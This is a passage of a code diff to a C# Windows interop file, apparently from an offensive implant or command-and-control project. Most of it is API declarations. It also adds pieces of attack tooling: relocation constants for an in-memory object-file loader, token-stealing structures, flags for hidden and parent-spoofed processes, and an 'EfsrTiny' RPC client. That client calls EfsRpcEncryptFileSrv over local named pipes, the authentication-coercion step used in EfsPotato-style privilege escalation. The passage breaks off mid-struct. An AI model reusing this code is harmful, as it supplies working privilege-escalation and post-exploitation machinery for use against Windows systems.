@@ -2,11 +2,13 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Runtime.InteropServices;
+using System.Security.Principal;
 using System.Text;
+using System.Threading.Tasks;
 
-namespace Engineer.Extra
+namespace DynamicEngLoading
 {
-    public class h_reprobate
+    public class h_DynInv
     {
         [StructLayout(LayoutKind.Sequential)]
         public struct UNICODE_STRING
@@ -55,6 +57,43 @@ namespace Engineer.Extra
         {
             public IntPtr Status;
             public IntPtr Information;
+        }
+
+        [StructLayout(LayoutKind.Explicit)]
+        public struct LargeInteger
+        {
+            [FieldOffset(0)]
+            public int Low;
+            [FieldOffset(4)]
+            public int High;
+            [FieldOffset(0)]
+            public long QuadPart;
+        }
+
+        [StructLayout(LayoutKind.Explicit, Size = 8)]
+        public struct LARGE_INTEGER
+        {
+            [FieldOffset(0)] public long QuadPart;
+            [FieldOffset(0)] public uint LowPart;
+            [FieldOffset(4)] public int HighPart;
+            [FieldOffset(0)] public int LowPartAsInt;
+            [FieldOffset(0)] public uint LowPartAsUInt;
+            [FieldOffset(4)] public int HighPartAsInt;
+            [FieldOffset(4)] public uint HighPartAsUInt;
+
+            public long ToInt64()
+            {
+                return ((long)this.HighPart << 32) | (uint)this.LowPartAsInt;
+            }
+
+            public static LARGE_INTEGER FromInt64(long value)
+            {
+                return new LARGE_INTEGER
+                {
+                    LowPartAsInt = (int)(value),
+                    HighPartAsInt = (int)((value >> 32))
+                };
+            }
         }
 
         [StructLayout(LayoutKind.Sequential)]
@@ -523,8 +562,22 @@ namespace Engineer.Extra
 
         /////////////////win32
         ///
-        public static class Win32
+        public unsafe static class Win32
         {
+            [DllImport("msvcrt.dll", EntryPoint = "memcpy", CallingConvention = CallingConvention.Cdecl, SetLastError = false)]
+            public static extern IntPtr memcpy(IntPtr dest, byte[] src, UInt32 count);
+
+            [DllImport("msvcrt.dll", EntryPoint = "memcpy", CallingConvention = CallingConvention.Cdecl, SetLastError = false)]
+            public static extern void* Memcpy(byte* dest, byte* src, void* count);
+
+
+            //top level fields for coff relocs 
+            public static int IMAGE_REL_AMD64_ADDR64 = 0x0001; // TODO: Move this to a global area
+            public static int IMAGE_REL_AMD64_ADDR32NB = 0x0003;
+            /* Most common from the looks of it, just 32-bit relative address from the byte following the relocation */
+            public static int IMAGE_REL_AMD64_REL32 = 0x0004;
+            public static int IMAGE_REL_AMD64_REL32_5 = 0x0009;
+
             public static class Kernel32
             {
                 [StructLayout(LayoutKind.Sequential)]
@@ -533,6 +586,7 @@ namespace Engineer.Extra
                     public uint VirtualAdress;
                     public uint SizeOfBlock;
                 }
+
 
                 [StructLayout(LayoutKind.Sequential)]
                 public struct IMAGE_IMPORT_DESCRIPTOR
@@ -679,6 +733,7 @@ namespace Engineer.Extra
                 [Flags]
                 public enum AllocationType : uint
                 {
+                    NULL = 0x0,
                     Commit = 0x1000,
                     Reserve = 0x2000,
                     Decommit = 0x4000,
@@ -705,6 +760,37 @@ namespace Engineer.Extra
                     GuardModifierflag = 0x100,
                     NoCacheModifierflag = 0x200,
                     WriteCombineModifierflag = 0x400
+                }
+
+                [Flags]
+                public enum PipeOpenModeFlags : uint
+                {
+                    PIPE_ACCESS_DUPLEX = 0x00000003,
+                    PIPE_ACCESS_INBOUND = 0x00000001,
+                    PIPE_ACCESS_OUTBOUND = 0x00000002,
+                    FILE_FLAG_FIRST_PIPE_INSTANCE = 0x00080000,
+                    FILE_FLAG_WRITE_THROUGH = 0x80000000,
+                    FILE_FLAG_OVERLAPPED = 0x40000000,
+                    WRITE_DAC = (uint)0x00040000L,
+                    WRITE_OWNER = (uint)0x00080000L,
+                    ACCESS_SYSTEM_SECURITY = (uint)0x01000000L
+                }
+
+                [Flags]
+                public enum PipeModeFlags : uint
+                {
+                    //One of the following type modes can be specified. The same type mode must be specified for each instance of the pipe.
+                    PIPE_TYPE_BYTE = 0x00000000,
+                    PIPE_TYPE_MESSAGE = 0x00000004,
+                    //One of the following read modes can be specified. Different instances of the same pipe can specify different read modes
+                    PIPE_READMODE_BYTE = 0x00000000,
+                    PIPE_READMODE_MESSAGE = 0x00000002,
+                    //One of the following wait modes can be specified. Different instances of the same pipe can specify different wait modes.
+                    PIPE_WAIT = 0x00000000,
+                    PIPE_NOWAIT = 0x00000001,
+                    //One of the following remote-client modes can be specified. Different instances of the same pipe can specify different remote-client modes.
+                    PIPE_ACCEPT_REMOTE_CLIENTS = 0x00000000,
+                    PIPE_REJECT_REMOTE_CLIENTS = 0x00000008
                 }
 
                 public enum PSS_CAPTURE_FLAGS : uint
@@ -742,6 +828,186 @@ namespace Engineer.Extra
                     PSS_QUERY_HANDLE_TRACE_INFORMATION = 6,
                     PSS_QUERY_PERFORMANCE_COUNTERS = 7
                 }
+
+                [Flags]
+                public enum EFileAccess : uint
+                {
+                    //
+                    // Standart Section
+                    //
+                    AccessSystemSecurity = 0x1000000,   // AccessSystemAcl access type
+                    MaximumAllowed = 0x2000000,     // MaximumAllowed access type
+                    Delete = 0x10000,
+                    ReadControl = 0x20000,
+                    WriteDAC = 0x40000,
+                    WriteOwner = 0x80000,
+                    Synchronize = 0x100000,
+
+                    StandardRightsRequired = 0xF0000,
+                    StandardRightsRead = ReadControl,
+                    StandardRightsWrite = ReadControl,
+                    StandardRightsExecute = ReadControl,
+                    StandardRightsAll = 0x1F0000,
+                    SpecificRightsAll = 0xFFFF,
+
+                    FILE_READ_DATA = 0x0001,        // file & pipe
+                    FILE_LIST_DIRECTORY = 0x0001,       // directory
+                    FILE_WRITE_DATA = 0x0002,       // file & pipe
+                    FILE_ADD_FILE = 0x0002,         // directory
+                    FILE_APPEND_DATA = 0x0004,      // file
+                    FILE_ADD_SUBDIRECTORY = 0x0004,     // directory
+                    FILE_CREATE_PIPE_INSTANCE = 0x0004, // named pipe
+                    FILE_READ_EA = 0x0008,          // file & directory
+                    FILE_WRITE_EA = 0x0010,         // file & directory
+                    FILE_EXECUTE = 0x0020,          // file
+                    FILE_TRAVERSE = 0x0020,         // directory
+                    FILE_DELETE_CHILD = 0x0040,     // directory
+                    FILE_READ_ATTRIBUTES = 0x0080,      // all
+                    FILE_WRITE_ATTRIBUTES = 0x0100,     // all
+
+                    //
+                    // Generic Section
+                    //
+
+                    GenericRead = 0x80000000,
+                    GenericWrite = 0x40000000,
+                    GenericExecute = 0x20000000,
+                    GenericAll = 0x10000000,
+
+                    SPECIFIC_RIGHTS_ALL = 0x00FFFF,
+                    FILE_ALL_ACCESS =
+                    StandardRightsRequired |
+                    Synchronize |
+                    0x1FF,
+
+                    FILE_GENERIC_READ =
+                    StandardRightsRead |
+                    FILE_READ_DATA |
+                    FILE_READ_ATTRIBUTES |
+                    FILE_READ_EA |
+                    Synchronize,
+
+                    FILE_GENERIC_WRITE =
+                    StandardRightsWrite |
+                    FILE_WRITE_DATA |
+                    FILE_WRITE_ATTRIBUTES |
+                    FILE_WRITE_EA |
+                    FILE_APPEND_DATA |
+                    Synchronize,
+
+                    FILE_GENERIC_EXECUTE =
+                    StandardRightsExecute |
+                      FILE_READ_ATTRIBUTES |
+                      FILE_EXECUTE |
+                      Synchronize
+                }
+
+                [Flags]
+                public enum EFileShare : uint
+                {
+                    /// <summary>
+                    ///
+                    /// </summary>
+                    None = 0x00000000,
+                    /// <summary>
+                    /// Enables subsequent open operations on an object to request read access.
+                    /// Otherwise, other processes cannot open the object if they request read access.
+                    /// If this flag is not specified, but the object has been opened for read access, the function fails.
+                    /// </summary>
+                    Read = 0x00000001,
+                    /// <summary>
+                    /// Enables subsequent open operations on an object to request write access.
+                    /// Otherwise, other processes cannot open the object if they request write access.
+                    /// If this flag is not specified, but the object has been opened for write access, the function fails.
+                    /// </summary>
+                    Write = 0x00000002,
+                    /// <summary>
+                    /// Enables subsequent open operations on an object to request delete access.
+                    /// Otherwise, other processes cannot open the object if they request delete access.
+                    /// If this flag is not specified, but the object has been opened for delete access, the function fails.
+                    /// </summary>
+                    Delete = 0x00000004
+                }
+
+                public enum ECreationDisposition : uint
+                {
+                    /// <summary>
+                    /// Creates a new file. The function fails if a specified file exists.
+                    /// </summary>
+                    New = 1,
+                    /// <summary>
+                    /// Creates a new file, always.
+                    /// If a file exists, the function overwrites the file, clears the existing attributes, combines the specified file attributes,
+                    /// and flags with FILE_ATTRIBUTE_ARCHIVE, but does not set the security descriptor that the SECURITY_ATTRIBUTES structure specifies.
+                    /// </summary>
+                    CreateAlways = 2,
+                    /// <summary>
+                    /// Opens a file. The function fails if the file does not exist.
+                    /// </summary>
+                    OpenExisting = 3,
+                    /// <summary>
+                    /// Opens a file, always.
+                    /// If a file does not exist, the function creates a file as if dwCreationDisposition is CREATE_NEW.
+                    /// </summary>
+                    OpenAlways = 4,
+                    /// <summary>
+                    /// Opens a file and truncates it so that its size is 0 (zero) bytes. The function fails if the file does not exist.
+                    /// The calling process must open the file with the GENERIC_WRITE access right.
+                    /// </summary>
+                    TruncateExisting = 5
+                }
+
+                [Flags]
+                public enum EFileAttributes : uint
+                {
+                    Readonly = 0x00000001,
+                    Hidden = 0x00000002,
+                    System = 0x00000004,
+                    Directory = 0x00000010,
+                    Archive = 0x00000020,
+                    Device = 0x00000040,
+                    Normal = 0x00000080,
+                    Temporary = 0x00000100,
+                    SparseFile = 0x00000200,
+                    ReparsePoint = 0x00000400,
+                    Compressed = 0x00000800,
+                    Offline = 0x00001000,
+                    NotContentIndexed = 0x00002000,
+                    Encrypted = 0x00004000,
+                    Write_Through = 0x80000000,
+                    Overlapped = 0x40000000,
+                    NoBuffering = 0x20000000,
+                    RandomAccess = 0x10000000,
+                    SequentialScan = 0x08000000,
+                    DeleteOnClose = 0x04000000,
+                    BackupSemantics = 0x02000000,
+                    PosixSemantics = 0x01000000,
+                    OpenReparsePoint = 0x00200000,
+                    OpenNoRecall = 0x00100000,
+                    FirstPipeInstance = 0x00080000
+                }
+
+                [Flags]
+                public enum HANDLE_FLAGS : uint
+                {
+                    None = 0,
+                    INHERIT = 1,
+                    PROTECT_FROM_CLOSE = 2
+                }
+                //set the consts for the handle of stdin, stdout, stderr
+                public const int STD_INPUT_HANDLE = -10;
+                public const int STD_OUTPUT_HANDLE = -11;
+                public const int STD_ERROR_HANDLE = -12;
+
+                public const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
+                public const int PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007;
+
+                public const int STARTF_USESTDHANDLES = 0x00000100;
+                public const int STARTF_USESHOWWINDOW = 0x00000001;
+                public const short SW_HIDE = 0x0000;
+
+                public const long BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;
+
             }
 
             public static class User32
@@ -1053,6 +1319,14 @@ namespace Engineer.Extra
                     SERVICE_ERROR_SEVERE = 0x00000002,
                     SERVICE_ERROR_CRITICAL = 0x00000003,
                 }
+
+                public struct TokenEntry
+                {
+                    public IntPtr hToken;
+                    public WindowsIdentity winId;
+                    public int pid;
+                    public string username;
+                }
             }
 
             public static class Dbghelp
@@ -1164,9 +1438,9 @@ namespace Engineer.Extra
                 [StructLayout(LayoutKind.Sequential)]
                 public struct _SECURITY_ATTRIBUTES
                 {
-                    UInt32 nLength;
-                    IntPtr lpSecurityDescriptor;
-                    Boolean bInheritHandle;
+                    public int nLength;
+                    public IntPtr lpSecurityDescriptor;
+                    public bool bInheritHandle;
                 };
             }
 
@@ -1216,6 +1490,24 @@ namespace Engineer.Extra
                     SecurityIdentification,
                     SecurityImpersonation,
                     SecurityDelegation
+                }
+
+                [Flags]
+                public enum SECURITY_INFORMATION : uint
+                {
+                    OWNER_SECURITY_INFORMATION = 0x00000001,
+                    GROUP_SECURITY_INFORMATION = 0x00000002,
+                    DACL_SECURITY_INFORMATION = 0x00000004,
+                    SACL_SECURITY_INFORMATION = 0x00000008,
+                    LABEL_SECURITY_INFORMATION = 0x00000010,
+                    ATTRIBUTE_SECURITY_INFORMATION = 0x00000020,
+                    SCOPE_SECURITY_INFORMATION = 0x00000040,
+                    PROCESS_TRUST_LABEL_SECURITY_INFORMATION = 0x00000080,
+                    BACKUP_SECURITY_INFORMATION = 0x00010000,
+                    PROTECTED_DACL_SECURITY_INFORMATION = 0x80000000,
+                    PROTECTED_SACL_SECURITY_INFORMATION = 0x40000000,
+                    UNPROTECTED_DACL_SECURITY_INFORMATION = 0x20000000,
+                    UNPROTECTED_SACL_SECURITY_INFORMATION = 0x10000000
                 }
 
                 public enum TOKEN_TYPE
@@ -1268,7 +1560,45 @@ namespace Engineer.Extra
                 public struct _LUID
                 {
                     public UInt32 LowPart;
-                    public UInt32 HighPart;
+                    public Int32 HighPart;
+                    public _LUID(UInt64 value)
+                    {
+                        LowPart = (UInt32)(value & 0xffffffffL);
+                        HighPart = (Int32)(value >> 32);
+                    }
+                    public _LUID(_LUID value)
+                    {
+                        LowPart = value.LowPart;
+                        HighPart = value.HighPart;
+                    }
+                    public _LUID(string value)
+                    {
+                        if (System.Text.RegularExpressions.Regex.IsMatch(value, @"^0x[0-9A-Fa-f]+$"))
+                        {
+                            // if the passed _LUID string is of form 0xABC123
+                            UInt64 uintVal = Convert.ToUInt64(value, 16);
+                            LowPart = (UInt32)(uintVal & 0xffffffffL);
+                            HighPart = (Int32)(uintVal >> 32);
+                        }
+                        else if (System.Text.RegularExpressions.Regex.IsMatch(value, @"^\d+$"))
+                        {
+                            // if the passed _LUID string is a decimal form
+                            UInt64 uintVal = UInt64.Parse(value);
+                            LowPart = (UInt32)(uintVal & 0xffffffffL);
+                            HighPart = (Int32)(uintVal >> 32);
+                        }
+                        else
+                        {
+                            System.ArgumentException argEx = new System.ArgumentException("Passed _LUID string value is not in a hex or decimal form", value);
+                            throw argEx;
+                        }
+                    }
+                    public static implicit operator ulong(_LUID luid)
+                    {
+                        // enable casting to a ulong
+                        UInt64 Value = ((UInt64)luid.HighPart << 32);
+                        return Value + luid.LowPart;
+                    }
                 }
 
                 [StructLayout(LayoutKind.Sequential)]
@@ -1290,7 +1620,24 @@ namespace Engineer.Extra
                 public struct _TOKEN_PRIVILEGES
                 {
                     public UInt32 PrivilegeCount;
-                    public _LUID_AND_ATTRIBUTES Privileges;
+                    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
+                    public _LUID_AND_ATTRIBUTES[] Privileges;
+                }
+                
+
+                [StructLayout(LayoutKind.Sequential)]
+                public struct TOKEN_GROUPS_AND_PRIVILEGES
+                {
+                    public uint SidCount;
+                    public uint SidLength;
+                    public IntPtr Sids;
+                    public uint RestrictedSidCount;
+                    public uint RestrictedSidLength;
+                    public IntPtr RestrictedSids;
+                    public uint PrivilegeCount;
+                    public uint PrivilegeLength;
+                    public IntPtr Privileges;
+                    public _LUID AuthenticationID;
                 }
 
                 [StructLayout(LayoutKind.Sequential)]
@@ -1396,6 +1743,18 @@ namespace Engineer.Extra
                     MaxTokenInfoClass
                 }
 
+                [Flags]
+                public enum LuidAttributes : uint
+                {
+                    DISABLED = 0x00000000,
+                    SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001,
+                    SE_PRIVILEGE_ENABLED = 0x00000002,
+                    SE_PRIVILEGE_REMOVED = 0x00000004,
+                    SE_PRIVILEGE_USED_FOR_ACCESS = 0x80000000
+                }
+
+
+
                 // http://www.pinvoke.net/default.aspx/Enums.ACCESS_MASK
                 [Flags]
                 public enum ACCESS_MASK : uint
@@ -1466,7 +1825,7 @@ namespace Engineer.Extra
                 [StructLayout(LayoutKind.Sequential)]
                 public struct _STARTUPINFO
                 {
-                    public UInt32 cb;
+                    public Int32 cb;
                     public String lpReserved;
                     public String lpDesktop;
                     public String lpTitle;
@@ -1490,8 +1849,8 @@ namespace Engineer.Extra
                 [StructLayout(LayoutKind.Sequential)]
                 public struct _STARTUPINFOEX
                 {
-                    _STARTUPINFO StartupInfo;
-                    // PPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
+                    public _STARTUPINFO StartupInfo;
+                    public IntPtr lpAttributeList;
                 };
 
                 //https://msdn.microsoft.com/en-us/library/windows/desktop/ms684873(v=vs.85).aspx
@@ -1578,12 +1937,362 @@ namespace Engineer.Extra
                     public IntPtr Buffer;
                 }
             }
+
+            //this code just copy-paste from gist
+            //orig class: rprn
+            //some changed for MS-EFSR
+            public class EfsrTiny
+            {
+                [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFromStringBindingW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
+                private static extern Int32 RpcBindingFromStringBinding(String bindingString, out IntPtr lpBinding);
+                [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingSetAuthInfoW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
+                private static extern Int32 RpcBindingSetAuthInfo(IntPtr lpBinding, string ServerPrincName, UInt32 AuthnLevel, UInt32 AuthnSvc, IntPtr AuthIdentity, UInt32 AuthzSvc);
+
+                [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, SetLastError = false)]
+                private static extern IntPtr NdrClientCall2x86(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr args);
+
+                [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFree", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
+                private static extern Int32 RpcBindingFree(ref IntPtr lpString);
+
+                [DllImport("Rpcrt4.dll", EntryPoint = "RpcStringBindingComposeW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
+                private static extern Int32 RpcStringBindingCompose(String ObjUuid, String ProtSeq, String NetworkAddr, String Endpoint, String Options, out IntPtr lpBindingString);
+
+                [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingSetOption", CallingConvention = CallingConvention.StdCall, SetLastError = false)]
+                private static extern Int32 RpcBindingSetOption(IntPtr Binding, UInt32 Option, IntPtr OptionValue);
+
+                [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, SetLastError = false)]
+                internal static extern IntPtr NdrClientCall2x64(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr binding, string FileName);
+
+                private static byte[] MIDL_ProcFormatStringx86 = new byte[] { 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x0c, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x02, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x04, 0x00, 0x0c, 0x00, 0x70, 0x00, 0x08, 0x00, 0x08, 0x00 };
+
+                private static byte[] MIDL_ProcFormatStringx64 = new byte[] { 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x18, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x02, 0x0a, 0x41, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x70, 0x00, 0x10, 0x00, 0x08, 0x00 };
+
+                private static byte[] MIDL_TypeFormatStringx86 = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x11, 0x04, 0x02, 0x00, 0x30, 0xa0, 0x00, 0x00, 0x11, 0x08, 0x25, 0x5c, 0x00, 0x00 };
+
+                private static byte[] MIDL_TypeFormatStringx64 = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x11, 0x04, 0x02, 0x00, 0x30, 0xa0, 0x00, 0x00, 0x11, 0x08, 0x25, 0x5c, 0x00, 0x00 };
+                Guid interfaceId;
+                public EfsrTiny(string pipe)
+                {
+                    IDictionary<string, string> bindingMapping = new Dictionary<string, string>()
+                    {
+                        {"lsarpc", "c681d488-d850-11d0-8c52-00c04fd90f7e"},
+                        {"efsrpc", "df1941c5-fe89-4e79-bf10-463657acf44d"},
+                        {"samr", "c681d488-d850-11d0-8c52-00c04fd90f7e"},
+                        {"lsass", "c681d488-d850-11d0-8c52-00c04fd90f7e"},
+                        {"netlogon", "c681d488-d850-11d0-8c52-00c04fd90f7e"}
+                    };
+
+                    interfaceId = new Guid(bindingMapping[pipe]);
+
+                    pipe = String.Format("\\pipe\\{0}", pipe);
+                    Console.WriteLine("[+] Pipe: " + pipe);
+                    if (IntPtr.Size == 8)
+                    {
+                        InitializeStub(interfaceId, MIDL_ProcFormatStringx64, MIDL_TypeFormatStringx64, pipe, 1, 0);
+                    }
+                    else
+                    {
+                        InitializeStub(interfaceId, MIDL_ProcFormatStringx86, MIDL_TypeFormatStringx86, pipe, 1, 0);
+                    }
+                }
+
+                ~EfsrTiny()
+                {
+                    freeStub();
+                }
+                public int EfsRpcEncryptFileSrv(string FileName)
+                {
+                    IntPtr result = IntPtr.Zero;
+                    IntPtr pfn = Marshal.StringToHGlobalUni(FileName);
+
+                    try
+                    {
+                        if (IntPtr.Size == 8)
+                        {
+                            result = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(2), Bind(Marshal.StringToHGlobalUni("localhost")), FileName);
+                        }
+                        else
+                        {
+                            result = CallNdrClientCall2x86(2, Bind(Marshal.StringToHGlobalUni("localhost")), pfn);
+                        }
+                    }
+                    catch (SEHException)
+                    {
+                        int err = Marshal.GetExceptionCode();
+                        Console.WriteLine("[-] EfsRpcEncryptFileSrv failed: " + err);
+                        return err;
+                    }
+                    finally
+                    {
+                        if (pfn != IntPtr.Zero)
+                            Marshal.FreeHGlobal(pfn);
+                    }
+                    return (int)result.ToInt64();
+                }
+                private byte[] MIDL_ProcFormatString;
+                private byte[] MIDL_TypeFormatString;
+                private GCHandle procString;
+                private GCHandle formatString;
+                private GCHandle stub;
+                private GCHandle faultoffsets;
+                private GCHandle clientinterface;
+                private string PipeName;
+
+                allocmemory AllocateMemoryDelegate = AllocateMemory;
+                freememory FreeMemoryDelegate = FreeMemory;
+
+                public UInt32 RPCTimeOut = 5000;
+
+                protected void InitializeStub(Guid interfaceID, byte[] MIDL_ProcFormatString, byte[] MIDL_TypeFormatString, string pipe, ushort MajorVerson, ushort MinorVersion)
+                {
+                    this.MIDL_ProcFormatString = MIDL_ProcFormatString;
+                    this.MIDL_TypeFormatString = MIDL_TypeFormatString;
+                    PipeName = pipe;
+                    procString = GCHandle.Alloc(this.MIDL_ProcFormatString, GCHandleType.Pinned);
+
+                    RPC_CLIENT_INTERFACE clientinterfaceObject = new RPC_CLIENT_INTERFACE(interfaceID, MajorVerson, MinorVersion);
+
+                    COMM_FAULT_OFFSETS commFaultOffset = new COMM_FAULT_OFFSETS();
+                    commFaultOffset.CommOffset = -1;
+                    commFaultOffset.FaultOffset = -1;
+                    faultoffsets = GCHandle.Alloc(commFaultOffset, GCHandleType.Pinned);
+                    clientinterface = GCHandle.Alloc(clientinterfaceObject, GCHandleType.Pinned);
+                    formatString = GCHandle.Alloc(MIDL_TypeFormatString, GCHandleType.Pinned);
+
+                    MIDL_STUB_DESC stubObject = new MIDL_STUB_DESC(formatString.AddrOfPinnedObject(),
+                                                                    clientinterface.AddrOfPinnedObject(),
+                                                                    Marshal.GetFunctionPointerForDelegate(AllocateMemoryDelegate),
+                                                                    Marshal.GetFunctionPointerForDelegate(FreeMemoryDelegate));
+
+                    stub = GCHandle.Alloc(stubObject, GCHandleType.Pinned);
+                }
+
+
+                protected void freeStub()
+                {
+                    procString.Free();
+                    faultoffsets.Free();
+                    clientinterface.Free();
+                    formatString.Free();
+                    stub.Free();
+                }
+
+                delegate IntPtr allocmemory(int size);
+
+                protected static IntPtr AllocateMemory(int size)
+                {
+                    IntPtr memory = Marshal.AllocHGlobal(size);
+                    return memory;
+                }
+
+                delegate void freememory(IntPtr memory);
+
+                protected static void FreeMemory(IntPtr memory)
+                {
+                    Marshal.FreeHGlobal(memory);
+                }
+
+
+                protected IntPtr Bind(IntPtr IntPtrserver)
+                {
+                    string server = Marshal.PtrToStringUni(IntPtrserver);
+                    IntPtr bindingstring = IntPtr.Zero;
+                    IntPtr binding = IntPtr.Zero;
+                    Int32 status;
+                    status = RpcStringBindingCompose(interfaceId.ToString(), "ncacn_np", server, PipeName, null, out bindingstring);
+                    if (status != 0)
+                    {
+                        Console.WriteLine("[-] RpcStringBindingCompose failed with status 0x" + status.ToString("x"));
+                        return IntPtr.Zero;
+                    }
+                    status = RpcBindingFromStringBinding(Marshal.PtrToStringUni(bindingstring), out binding);
+                    RpcBindingFree(ref bindingstring);
+                    if (status != 0)
+                    {
+                        Console.WriteLine("[-] RpcBindingFromStringBinding failed with status 0x" + status.ToString("x"));
+                        return IntPtr.Zero;
+                    }
+
+                    status = RpcBindingSetAuthInfo(binding, server, /* RPC_C_AUTHN_LEVEL_PKT_PRIVACY */ 6, /* RPC_C_AUTHN_GSS_NEGOTIATE */ 9, IntPtr.Zero, AuthzSvc: 16);
+                    if (status != 0)
+                    {
+                        Console.WriteLine("[-] RpcBindingSetAuthInfo failed with status 0x" + status.ToString("x"));
+                    }
+
+                    status = RpcBindingSetOption(binding, 12, new IntPtr(RPCTimeOut));
+                    if (status != 0)
+                    {
+                        Console.WriteLine("[-] RpcBindingSetOption failed with status 0x" + status.ToString("x"));
+                    }
+                    Console.WriteLine("[+] binding ok (handle=" + binding.ToString("x") + ")");
+                    return binding;
+                }
+
+                protected IntPtr GetProcStringHandle(int offset)
+                {
+                    return Marshal.UnsafeAddrOfPinnedArrayElement(MIDL_ProcFormatString, offset);
+                }
+
+                protected IntPtr GetStubHandle()
+                {
+                    return stub.AddrOfPinnedObject();
+                }
+                protected IntPtr CallNdrClientCall2x86(int offset, params IntPtr[] args)
+                {
+
+                    GCHandle stackhandle = GCHandle.Alloc(args, GCHandleType.Pinned);
+                    IntPtr result;
+                    try
+                    {
+                        result = NdrClientCall2x86(GetStubHandle(), GetProcStringHandle(offset), stackhandle.AddrOfPinnedObject());
+                    }
+                    finally
+                    {
+                        stackhandle.Free();
+                    }
+                    return result;
+                }
+
+
+                [StructLayout(LayoutKind.Sequential)]
+                struct COMM_FAULT_OFFSETS
+                {
+                    public short CommOffset;
+                    public short FaultOffset;
+                }
+
+                [StructLayout(LayoutKind.Sequential)]
+                struct RPC_VERSION
+                {
+                    public ushort MajorVersion;
+                    public ushort MinorVersion;
+                    public RPC_VERSION(ushort InterfaceVersionMajor, ushort InterfaceVersionMinor)
+                    {
+                        MajorVersion = InterfaceVersionMajor;
+                        MinorVersion = InterfaceVersionMinor;
+                    }
+                }
+
+                [StructLayout(LayoutKind.Sequential)]
+                struct RPC_SYNTAX_IDENTIFIER
+                {
+                    public Guid SyntaxGUID;
+                    public RPC_VERSION SyntaxVersion;
+                }
+
+                [StructLayout(LayoutKind.Sequential)]
+                struct RPC_CLIENT_INTERFACE
+                {
+                    public uint Length;
+                    public RPC_SYNTAX_IDENTIFIER InterfaceId;
+                    public RPC_SYNTAX_IDENTIFIER TransferSyntax;
+                    public IntPtr /*PRPC_DISPATCH_TABLE*/ DispatchTable;
+                    public uint RpcProtseqEndpointCount;
+                    public IntPtr /*PRPC_PROTSEQ_ENDPOINT*/ RpcProtseqEndpoint;
+                    public IntPtr Reserved;
+                    public IntPtr InterpreterInfo;
+                    public uint Flags;
+
+                    public static Guid IID_SYNTAX = new Guid(0x8A885D04u, 0x1CEB, 0x11C9, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60);
+
+                    public RPC_CLIENT_INTERFACE(Guid iid, ushort InterfaceVersionMajor, ushort InterfaceVersionMinor)
+                    {
+                        Length = (uint)Marshal.SizeOf(typeof(RPC_CLIENT_INTERFACE));
+                        RPC_VERSION rpcVersion = new RPC_VERSION(InterfaceVersionMajor, InterfaceVersionMinor);
+                        InterfaceId = new RPC_SYNTAX_IDENTIFIER();
+                        InterfaceId.SyntaxGUID = iid;
+                        InterfaceId.SyntaxVersion = rpcVersion;
+                        rpcVersion = new RPC_VERSION(2, 0);
+                        TransferSyntax = new RPC_SYNTAX_IDENTIFIER();
+                        TransferSyntax.SyntaxGUID = IID_SYNTAX;
+                        TransferSyntax.SyntaxVersion = rpcVersion;
+                        DispatchTable = IntPtr.Zero;
+                        RpcProtseqEndpointCount = 0u;
+                        RpcProtseqEndpoint = IntPtr.Zero;
+                        Reserved = IntPtr.Zero;
+                        InterpreterInfo = IntPtr.Zero;
+                        Flags = 0u;
+                    }
+                }
+
+                [StructLayout(LayoutKind.Sequential)]
+                struct MIDL_STUB_DESC
+                {
+                    public IntPtr /*RPC_CLIENT_INTERFACE*/ RpcInterfaceInformation;
+                    public IntPtr pfnAllocate;
+                    public IntPtr pfnFree;
+                    public IntPtr pAutoBindHandle;
+                    public IntPtr /*NDR_RUNDOWN*/ apfnNdrRundownRoutines;
+                    public IntPtr /*GENERIC_BINDING_ROUTINE_PAIR*/ aGenericBindingRoutinePairs;
+                    public IntPtr /*EXPR_EVAL*/ apfnExprEval;
+                    public IntPtr /*XMIT_ROUTINE_QUINTUPLE*/ aXmitQuintuple;
+                    public IntPtr pFormatTypes;
+                    public int fCheckBounds;
+                    /* Ndr library version. */
+                    public uint Version;
+                    public IntPtr /*MALLOC_FREE_STRUCT*/ pMallocFreeStruct;
+                    public int MIDLVersion;
+                    public IntPtr CommFaultOffsets;
+                    // New fields for version 3.0+
+                    public IntPtr /*USER_MARSHAL_ROUTINE_QUADRUPLE*/ aUserMarshalQuadruple;
+                    // Notify routines - added for NT5, MIDL 5.0
+                    public IntPtr /*NDR_NOTIFY_ROUTINE*/ NotifyRoutineTable;
+                    public IntPtr mFlags;
+                    // International support routines - added for 64bit post NT5
